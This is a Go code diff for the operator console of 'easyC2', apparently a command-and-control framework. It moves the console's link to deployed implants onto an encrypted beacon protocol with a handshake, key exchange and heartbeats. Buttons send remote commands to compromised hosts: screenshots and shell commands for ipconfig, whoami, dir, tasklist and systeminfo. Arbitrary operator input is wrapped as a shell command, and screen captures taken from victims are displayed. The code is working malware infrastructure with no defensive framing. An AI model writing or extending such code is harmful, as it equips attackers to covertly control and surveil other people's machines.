@@ -1,6 +1,7 @@
 package main
 
 import (
+	"easyC2/common"
 	"bytes"
 	"fmt"
 	"fyne.io/fyne/v2"
@@ -36,6 +37,7 @@ var (
 	screenshotFilePaths []string
 	myApp               fyne.App    // 新增全局App变量
 	mainWindow          fyne.Window // 新增全局Window变量
+	globalBeaconConn    *common.BeaconConnection // 全局beacon连接
 )
 
 // GbkToUtf8 将GBK编码的字节转换为UTF-8
@@ -45,11 +47,9 @@ func GbkToUtf8(gbk []byte) ([]byte, error) {
 	return ioutil.ReadAll(utf8Reader)
 }
 
-func ReadConn(conn *net.Conn) {
-	buf := make([]byte, 10*1024*1024)
-
+func ReadConn(beaconConn *common.BeaconConnection) {
 	for {
-		n, err := (*conn).Read(buf)
+		msg, err := beaconConn.ReadMessage()
 		if err != nil {
 			fmt.Println("读取服务器响应失败:", err)
 			globalOutputText.SetText(globalOutputText.Text + "\n连接断开: " + err.Error())
@@ -59,23 +59,50 @@ func ReadConn(conn *net.Conn) {
 				time.Sleep(5 * time.Second)
 				newConn, dialErr := net.Dial("tcp", ServerAddr)
 				if dialErr == nil {
-					*conn = newConn
+					// 创建新的beacon连接
+					newBeaconConn := common.NewBeaconConnection(newConn)
+					
+					// 执行握手
+					err := newBeaconConn.PerformHandshake()
+					if err != nil {
+						fmt.Println("重连握手失败:", err)
+						return
+					}
+
+					// 执行密钥交换
+					err = newBeaconConn.PerformKeyExchange()
+					if err != nil {
+						fmt.Println("重连密钥交换失败:", err)
+						return
+					}
+
+					globalBeaconConn = newBeaconConn
 					globalOutputText.SetText(globalOutputText.Text + "\n已重新连接到服务器")
-					go ReadConn(conn)
+					go ReadConn(newBeaconConn)
 				}
 			}()
 			return
 		}
 
-		data := buf[:n]
-		message := string(data)
+		// 处理不同类型的消息
+		switch msg.Type {
+		case common.BeaconData:
+			message := string(msg.Payload)
+			
+			// 检查是否是截图文件路径
+			if strings.HasPrefix(message, "SCREENSHOT_FILES:") {
+				handleScreenshotFiles(message)
+			} else {
+				// 普通文本消息
+				displayCommandOutput(msg.Payload)
+			}
 
-		// 检查是否是截图文件路径
-		if strings.HasPrefix(message, "SCREENSHOT_FILES:") {
-			handleScreenshotFiles(message)
-		} else {
-			// 普通文本消息
-			displayCommandOutput(data)
+		case common.BeaconHeartbeat:
+			// 回复心跳
+			beaconConn.SendMessage(common.BeaconHeartbeatAck, []byte("heartbeat_ack"))
+
+		default:
+			fmt.Printf("收到未知消息类型: %d\n", msg.Type)
 		}
 	}
 }
@@ -198,23 +225,27 @@ func displayScreenshot(data []byte) {
 		globalOutputText.SetText(globalOutputText.Text + "\n截图显示失败: " + err.Error())
 
 		// 尝试以临时文件方式保存并加载
-		tempFile, tempErr := ioutil.TempFile("", "screenshot-*.png")
-		if tempErr != nil {
-			fmt.Println("创建临时文件失败:", tempErr)
+		tempFile, err := ioutil.TempFile("", "screenshot_*.png")
+		if err != nil {
+			fmt.Println("创建临时文件失败:", err)
+			return
+		}
+		defer tempFile.Close()
+		defer os.Remove(tempFile.Name())
+
+		// 写入临时文件
+		if err := png.Encode(tempFile, img); err != nil {
+			fmt.Println("PNG编码失败:", err)
 			return
 		}
 
-		tempFile.Write(data)
-		tempFile.Close()
-		fmt.Println("已将截图保存为临时文件:", tempFile.Name())
-
-		// 尝试使用文件路径加载图像
-		img := canvas.NewImageFromFile(tempFile.Name())
-		img.FillMode = canvas.ImageFillContain
+		// 从临时文件加载图像
+		canvasImg := canvas.NewImageFromFile(tempFile.Name())
+		canvasImg.FillMode = canvas.ImageFillContain
 
 		// 更新图片容器
 		globalImgContainer.RemoveAll()
-		globalImgContainer.Add(img)
+		globalImgContainer.Add(canvasImg)
 		globalImgContainer.Refresh()
 
 		// 切换到截图选项卡
@@ -222,34 +253,42 @@ func displayScreenshot(data []byte) {
 		return
 	}
 
-	fmt.Printf("成功解码图像，格式: %s, 尺寸: %dx%d\n", format, img.Bounds().Dx(), img.Bounds().Dy())
+	fmt.Printf("成功解码图像，格式: %s\n", format)
 
-	// 使用已解码的图像重新编码为PNG（确保格式正确）
-	var buf bytes.Buffer
-	if err := png.Encode(&buf, img); err != nil {
-		fmt.Println("重新编码图像失败:", err)
+	// 创建临时文件保存图像
+	tempFile, err := ioutil.TempFile("", "screenshot_*.png")
+	if err != nil {
+		fmt.Println("创建临时文件失败:", err)
+		return
+	}
+	defer tempFile.Close()
+	defer os.Remove(tempFile.Name())
+
+	// 编码为PNG并保存
+	if err := png.Encode(tempFile, img); err != nil {
+		fmt.Println("PNG编码失败:", err)
 		return
 	}
 
-	// 使用规范的PNG数据创建图像
-	resource := fyne.NewStaticResource("screenshot.png", buf.Bytes())
-	imgWidget := canvas.NewImageFromResource(resource)
-	imgWidget.FillMode = canvas.ImageFillContain
+	// 从临时文件加载图像
+	canvasImg := canvas.NewImageFromFile(tempFile.Name())
+	canvasImg.FillMode = canvas.ImageFillContain
 
 	// 更新图片容器
 	globalImgContainer.RemoveAll()
-	globalImgContainer.Add(imgWidget)
+	globalImgContainer.Add(canvasImg)
 	globalImgContainer.Refresh()
 
 	// 切换到截图选项卡
 	globalTabs.SelectIndex(1)
 }
 
-// 发送命令到服务器
-func sendCommand(conn net.Conn, cmd string) {
-	if _, err := conn.Write([]byte(cmd)); err != nil {
+func sendCommand(beaconConn *common.BeaconConnection, cmd string) {
+	err := beaconConn.SendData([]byte(cmd))
+	if err != nil {
 		fmt.Println("发送命令失败:", err)
 		globalOutputText.SetText(globalOutputText.Text + "\n发送命令失败: " + err.Error())
+		return
 	}
 	fmt.Println("已发送命令:", cmd)
 	// 显示已发送的命令
@@ -257,34 +296,34 @@ func sendCommand(conn net.Conn, cmd string) {
 }
 
 // 创建命令面板
-func createCommandPanel(conn net.Conn) fyne.CanvasObject {
+func createCommandPanel(beaconConn *common.BeaconConnection) fyne.CanvasObject {
 	// 命令输入
 	commandEntry := widget.NewMultiLineEntry()
 	commandEntry.SetPlaceHolder("输入命令...")
 	commandHistory := []string{}
 	// 快捷命令按钮
 	screenshotBtn := widget.NewButton("截图", func() {
-		sendCommand(conn, "screenshot")
+		sendCommand(beaconConn, "screenshot")
 	})
 
 	ipConfigBtn := widget.NewButton("IP配置", func() {
-		sendCommand(conn, "shell ipconfig")
+		sendCommand(beaconConn, "shell ipconfig")
 	})
 
 	whoamiBtn := widget.NewButton("当前用户", func() {
-		sendCommand(conn, "shell whoami")
+		sendCommand(beaconConn, "shell whoami")
 	})
 
 	dirBtn := widget.NewButton("列出文件", func() {
-		sendCommand(conn, "shell dir")
+		sendCommand(beaconConn, "shell dir")
 	})
 
 	processBtn := widget.NewButton("进程列表", func() {
-		sendCommand(conn, "shell tasklist")
+		sendCommand(beaconConn, "shell tasklist")
 	})
 
 	systemInfoBtn := widget.NewButton("系统信息", func() {
-		sendCommand(conn, "shell systeminfo")
+		sendCommand(beaconConn, "shell systeminfo")
 	})
 
 	// 执行按钮
@@ -294,7 +333,7 @@ func createCommandPanel(conn net.Conn) fyne.CanvasObject {
 			if !strings.HasPrefix(cmd, "shell ") && cmd != "screenshot" {
 				cmd = "shell " + cmd
 			}
-			sendCommand(conn, cmd)
+			sendCommand(beaconConn, cmd)
 			commandHistory = append(commandHistory, cmd)
 
 			commandEntry.SetText("")
@@ -325,7 +364,7 @@ func createCommandPanel(conn net.Conn) fyne.CanvasObject {
 			if !strings.HasPrefix(cmd, "shell ") && cmd != "screenshot" {
 				cmd = "shell " + cmd
 			}
-			sendCommand(conn, cmd)
+			sendCommand(beaconConn, cmd)
 			commandHistory = append(commandHistory, cmd)
 
 			commandEntry.SetText("")
@@ -349,7 +388,7 @@ func createCommandPanel(conn net.Conn) fyne.CanvasObject {
 }
 
 // 创建输出/截图显示面板
-func createOutputPanel(conn net.Conn, myapp fyne.App, window fyne.Window) fyne.CanvasObject {
+func createOutputPanel(beaconConn *common.BeaconConnection, myapp fyne.App, window fyne.Window) fyne.CanvasObject {
 	// 使用选项卡显示文本输出和截图
 	tabs := container.NewAppTabs()
 
@@ -454,9 +493,9 @@ func createOutputPanel(conn net.Conn, myapp fyne.App, window fyne.Window) fyne.C
 
 		selectWidget := widget.NewSelect(options, nil)
 
-		dialog.ShowCustomConfirm("选择要全屏查看的截图", "查看", "取消",
-			selectWidget, func(confirm bool) {
-				if !confirm || selectWidget.Selected == "" {
+		dialog.ShowCustomConfirm("选择要全屏显示的截图", "显示", "取消",
+			selectWidget, func(show bool) {
+				if !show || selectWidget.Selected == "" {
 					return
 				}
 
@@ -472,7 +511,7 @@ func createOutputPanel(conn net.Conn, myapp fyne.App, window fyne.Window) fyne.C
 	})
 
 	refreshBtn := widget.NewButton("刷新截图", func() {
-		sendCommand(conn, "screenshot")
+		sendCommand(beaconConn, "screenshot")
 	})
 
 	// 截图控制按钮布局
@@ -585,7 +624,7 @@ func (m *myDarkTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant)
 	}
 }
 
-func getStatusBar(conn *net.Conn) fyne.CanvasObject {
+func getStatusBar(beaconConn *common.BeaconConnection) fyne.CanvasObject {
 	statusLabel := widget.NewLabel("状态: 已连接")
 
 	// 更新时间的goroutine
@@ -620,22 +659,40 @@ func main() {
 				dialog.ShowError(fmt.Errorf("重连失败: %v", dialErr), window)
 				return
 			}
-			dial = newDial
+
+			// 创建新的beacon连接
+			newBeaconConn := common.NewBeaconConnection(newDial)
+			
+			// 执行握手
+			err := newBeaconConn.PerformHandshake()
+			if err != nil {
+				dialog.ShowError(fmt.Errorf("握手失败: %v", err), window)
+				return
+			}
+
+			// 执行密钥交换
+			err = newBeaconConn.PerformKeyExchange()
+			if err != nil {
+				dialog.ShowError(fmt.Errorf("密钥交换失败: %v", err), window)
+				return
+			}
+
+			globalBeaconConn = newBeaconConn
 
 			// 重新设置UI并启动监听
 			splitContainer := container.NewHSplit(
-				createCommandPanel(dial),
-				createOutputPanel(dial, myApp, window),
+				createCommandPanel(newBeaconConn),
+				createOutputPanel(newBeaconConn, myApp, window),
 			)
 			splitContainer.Offset = 0.3
 
-			statusBar := getStatusBar(&dial)
+			statusBar := getStatusBar(newBeaconConn)
 
 			window.SetContent(
 				container.NewBorder(nil, statusBar, nil, nil, splitContainer),
 			)
 
-			go ReadConn(&dial)
+			go ReadConn(newBeaconConn)
 
 			dialog.ShowInformation("成功", "已连接到服务器", window)
 		})
@@ -650,15 +707,36 @@ func main() {
 		return
 	}
 
+	// 创建beacon连接
+	beaconConn := common.NewBeaconConnection(dial)
+	
+	// 执行握手
+	err = beaconConn.PerformHandshake()
+	if err != nil {
+		dialog.ShowError(fmt.Errorf("握手失败: %v", err), window)
+		dial.Close()
+		return
+	}
+
+	// 执行密钥交换
+	err = beaconConn.PerformKeyExchange()
+	if err != nil {
+		dialog.ShowError(fmt.Errorf("密钥交换失败: %v", err), window)
+		dial.Close()
+		return
+	}
+
+	globalBeaconConn = beaconConn
+
 	// 创建一个水平分割的主布局
 	splitContainer := container.NewHSplit(
-		createCommandPanel(dial),
-		createOutputPanel(dial, myApp, window),
+		createCommandPanel(beaconConn),
+		createOutputPanel(beaconConn, myApp, window),
 	)
 	splitContainer.Offset = 0.3 // 30% 的空间给左侧
 
 	// 状态栏
-	statusBar := getStatusBar(&dial)
+	statusBar := getStatusBar(beaconConn)
 
 	// 设置主窗口内容
 	window.SetContent(
@@ -666,7 +744,7 @@ func main() {
 	)
 
 	// 开始监听服务器响应
-	go ReadConn(&dial)
+	go ReadConn(beaconConn)
 
 	// 显示窗口并运行应用
 	window.ShowAndRun()
